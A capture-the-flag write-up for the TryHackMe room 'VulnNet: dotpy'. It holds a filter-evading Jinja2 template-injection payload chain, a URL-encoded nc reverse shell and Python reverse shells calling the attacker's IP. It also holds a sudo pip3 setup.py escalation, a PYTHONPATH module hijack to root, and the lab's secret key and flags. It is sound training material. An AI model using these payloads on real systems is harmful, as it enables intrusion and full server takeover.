# Tryhackme.com Room : Vulnet Dotpy

`https://tryhackme.com/room/vulnnetdotpy`

## Instance

```bash
export IP="10.10.137.74"
```

## Nmap

```
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-methods:
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
| http-title: VulnNet Entertainment -  Login  | Discover
|_Requested resource was http://10.10.137.74:8080/login
```

## Initial Foothold

When browsing the website, we get to a login screen.



There is a contact us link which link to `hello@vulnnet.com`

Let's add `vulnnet.com` to our host file.

Maybe this email address can be used to send an XSS payload later on ?



The forgot password link doesn't work, let's create a user

```
user:password
```

We get to an analytics dashboard named `staradmin`. 

but its just a template, we can't really do anything except logging out



When trying to access `vulnnet.com:8080/robots.txt` we get

```
INVALID CHARACTERS DETECTED
Your request has been blocked.
If you think this is an issue contact us at support@vulnnet.com
ID: 1c36bc623da792fa41c832ne 
```

Seems like this happen when `.txt` or `.php` is in the url.

Actually, seems like when we have a `.` followed by anything.

Actually, some `.html` file works, so seems like we get a `403` if we add an extension and the file doesn't exist. (Those route are also accessible without the `.html` ex : `/icons` & `/icons.html`)



We have the following `session` cookie:

```
.eJwtzjFuA0EIheG7TJ1igWEAX2Y1DCBbkRJp166i3N2rKOX7m_f9tL2OPO_t9jxe-dH2R7Rbgy6TS9MYN1YDHt7DSWXJlZkjXGxELYMcCj7QQhWJNTWzj6A-AWaw0IKcgkTMPLsz51iyIn1V1NBOJprhPjdMIVBA1V7tgrzOPP4111znUfvz-zO__nibKSwUVrJpOFDr-nSAtA6h3NHRK9rvG5W3Pmo.YIsm3w.CpnX_r4kvf7qwlVEBr84HkD_Uzo
```

Maybe this can tell us information on the framework used ?



We have control over the `email` variable which is printed in the profil popup.

Not vulnerable to xss, but might be vulnerable to template injection ?

didn't work with `{{7*7}}` and variations

Hmm, tried to inject the `username` as well but didn't work



If we put random values in the cookie we get at `403 Access denied` 



Lookig at the request headers we see that it is served by

```
Werkzeug/1.0.1 Python/3.6.9
```



We can get code execution on the `404` page ! 

`vulnet.com:8080/{{7*7}}` show `49`

`/{{}}` give us a `jinja2.exceptions.TemplateSyntaxError` stacktrace



The server run from `/home/web/shuriken-dotpy/app/home/routes.py`

We see the following code

```
try:
    if not template.endswith( '.html' ):
        template += '.html'
    return render_template( template )

except TemplateNotFound:
    s = request.path.strip("/")
    if "." in s or "_" in s or "[" in s or "]" in s:
        template = '''
```

We see that the following characters trigger the `INVALID characters` error :

```
.
_
[
]
```

We can execute code but we got to find a way to execute something usefull without these.. 

hmm might prove challenging...



Tried this

```
/{{import os; pwn=getattr(os,'popen');getattr(pwn('ls'),'read')()}}
```

seems like we can't have spaces



```
/{{getattr(getattr(os,'popen')('ls'),'read')()}}
```

getattr is undefined



```
/{{os|attr('popen')}}
```

We can access the attribute but `os` is undefined



hmm doesn't seem like we can `import` stuff inside jinja2...

Another way would be to access `__class__` attributes of string and retrive some function but we can't use `_` .

Hmmm...

We can dump the config object (Kept only interesting keys)

```
{   
   'SECRET_KEY':'S3cr3t_K#Key',
   'SQLALCHEMY_DATABASE_URI':'sqlite:////home/web/shuriken-dotpy/db.sqlite3',
}
```

To go around the `INVALID CHARACTERS` restriction, we can use query parameters to pass data around and retrieve the info using the `request` object.

Our goal is to run something like this to retrieve the `subprocess.Popen` method :
```
''.__class__.__mro__[XX].__subclasses__()[XX]
```
Once we have this, we have code execution.

To retrieve the value of the query parameters we can use :
```
request|attr('args')|attr('get')('PARAMETER_NAME')
```

As a first test, we run `''.__class__.__name__` with:
```
vulnnet.com:8080/{{ ''|attr(request|attr('args')|attr('get')('first'))|attr(request|attr('args')|attr('get')('second'))}}?first=__class__&second=__name__
```
We validate that we get `str` as a response


Then we enumerate all available functions with
```
vulnnet.com:8080/{{ ''|attr(request|attr('args')|attr('get')('first'))|attr(request|attr('args')|attr('get')('second'))|last|attr(request|attr('args')|attr('get')('third'))()|list}}?first=__class__&second=__mro__&third=__subclasses__
```
By copying in sublime text and reformating everything, we find that the `subprocess.Popen` method is at index `401`

We can validate this with :
```
vulnnet.com:8080/{{ ''|attr(request|attr('args')|attr('get')('first'))|attr(request|attr('args')|attr('get')('second'))|last|attr(request|attr('args')|attr('get')('third'))()|attr(request|attr('args')|attr('get')('fourth'))(401)}}?first=__class__&second=__mro__&third=__subclasses__&fourth=__getitem__
```

And then let's run a test command to see if we receive a GET request on our machine:
```
vulnnet.com:8080/{{ ''|attr(request|attr('args')|attr('get')('first'))|attr(request|attr('args')|attr('get')('second'))|last|attr(request|attr('args')|attr('get')('third'))()|attr(request|attr('args')|attr('get')('fourth'))(401)(request|attr('args')|attr('get')('cmd'),shell=True)}}?first=__class__&second=__mro__&third=__subclasses__&fourth=__getitem__&cmd=wget http://10.6.32.20:8000/pwned
```
And we got a callback !!


Now let's get a reverse shell by changing our `cmd` query parameter 
(we got to url encode the command otherwise the `&` symbol get in the way)

The reverse shell used is :
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.32.20 7777 >/tmp/f
```

The full command is :
```
vulnnet.com:8080/{{ ''|attr(request|attr('args')|attr('get')('first'))|attr(request|attr('args')|attr('get')('second'))|last|attr(request|attr('args')|attr('get')('third'))()|attr(request|attr('args')|attr('get')('fourth'))(401)(request|attr('args')|attr('get')('cmd'),shell=True)}}?first=__class__&second=__mro__&third=__subclasses__&fourth=__getitem__&cmd=%2Fbin%2Fsh%20-c%20%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.6.32.20%207777%20%3E%2Ftmp%2Ff%27
```

And we're in !
But we are logged as `web` user.
We need to get access to `system-adm` user to get the user flag.

## Lateral movement

While looking around, we find `/opt/backup.py` owned by root. We can probably inject a dependency there to get root.
Doesn't seem to be runned in a crontab so probably need to be runned via `sudo` from the `system-adm` user.

Oh welll, i was looking around thinking that I wouldn't be able to run `sudo -l` without a password. Well we can !
```
(system-adm) NOPASSWD: /usr/bin/pip3 install *
```

Looking at `gtfobins` we find this :
```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```

Soo, let's create a `setup.py` file

Hmm this method doesn't work, we get `cannot open /dev/pts/0 : permission denied`

Let's create another revshell in the `setup.py` script

```
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect(("10.6.32.20",7778))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")' > pwn/setup.py
```

We run it using 
```
sudo -u system-adm /usr/bin/pip3 install ./pwn
```

And we are now `system-adm` !

`/home/system-adm/user.txt` :
```
THM{91c7547864fa1314a306f82a14cd7fb4}
```

## Priv esc
From there, running `sudo -l` gives us :
```
User system-adm may run the following commands on vulnnet-dotpy:
    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
```

As we hypothesized, we need to inject a module into `/opt/backup.py`

3 modules are loaded in `backup.py`
```
from datetime import datetime
from pathlib import Path
import zipfile
```

We can simply create an `__init__.py` file in `/home/system-adm/python_path/zipfile` and set
```
export PYTHONPATH=/home/system-adm/python_path
```

The variable should be preserved due to `SETENV` in sudo

So actually, the variable is not automatically preserved we need
```
sudo -E PYTHONPATH=/home/system-adm/python_path /usr/bin/python3 /opt/backup.py
```

And we get code execution.

For simplicity, we'll just reuse the python revshell code again, opening a 3 revshell as root
```
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect(("10.6.32.20",7779))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")' > /home/system-adm/python_path/zipfile/__init__.py
```

Anddd we are root !

`/root/root.txt`
```
THM{734c7c2f0a23a4f590aa8600676021fb}
```

## End

